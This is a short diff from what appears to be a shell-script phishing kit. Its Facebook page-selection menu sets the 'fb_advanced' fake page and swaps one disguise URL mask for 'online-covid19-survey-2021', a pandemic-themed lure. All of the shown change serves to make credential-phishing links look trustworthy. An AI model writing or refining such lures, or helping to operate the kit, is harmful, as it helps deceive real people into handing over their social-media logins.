@@ -484,7 +484,7 @@ site_facebook() {
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://online-covid19-survey-2021'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
